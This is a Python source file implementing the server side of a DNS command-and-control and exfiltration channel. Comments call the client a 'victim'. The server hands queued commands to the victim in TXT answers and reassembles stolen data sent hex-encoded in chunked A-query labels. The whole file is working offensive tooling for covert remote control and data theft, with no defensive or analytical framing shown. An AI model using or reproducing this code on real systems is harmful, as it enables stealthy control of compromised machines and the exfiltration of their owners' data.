import binascii
import socketserver
import threading
from dnslib import DNSRecord, QTYPE, RR, A, TXT
import config as cfg

# ----------------------------------- DNS ----------------------------------- #

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, sock = self.request
        global expected_chunks, exfil_buffer
        try:
            req   = DNSRecord.parse(data)
            qname = str(req.q.qname).rstrip('.')
            qtype = QTYPE[req.q.qtype]
        except Exception as e:
            print(f"❌ [dns] parse error: {e}")
            return
        reply = req.reply()
       
        # Victim pulling commands via TXT
        if qtype == "TXT" and qname == f"command.{cfg.DNS_DOMAIN}":
            if cfg.command_queue:
                cmd = cfg.command_queue.pop(0)
                print(f"📤 [dns-cmd] sending: {cmd!r}")
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(cmd), ttl=0))
            try:
                sock.sendto(reply.pack(), self.client_address)
            except Exception as e:
                print(f"❌ [dns] failed to send TXT reply: {e}")
            return

        # Victim exfiltrating via A-queries
        if qtype == "A":
            label = qname.split('.', 1)[0]
            if '-' in label and '/' in label:
                hdr, hx = label.split('-', 1)
                seq_s, tot_s = hdr.split('/', 1)
                try:
                    seq = int(seq_s, 16)
                    tot = int(tot_s, 16)
                    chunk = binascii.unhexlify(hx)
                    exfil_buffer[seq] = chunk

                    # On the first chunk, remember how many we expect
                    if expected_chunks is None:
                        expected_chunks = tot
                    print(f"📥 [dns-exfil] got chunk {seq}/{tot}")
                except Exception as e:
                    print(f"⚠️ parse error on label {label}: {e}")

            # Reply harmlessly so the kernel unblocks
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
            sock.sendto(reply.pack(), self.client_address)


def start_dns_server():
    server = socketserver.ThreadingUDPServer(('0.0.0.0', cfg.DNS_PORT), DNSHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"🚧 DNS server listening on UDP/53 for domain {cfg.DNS_DOMAIN}")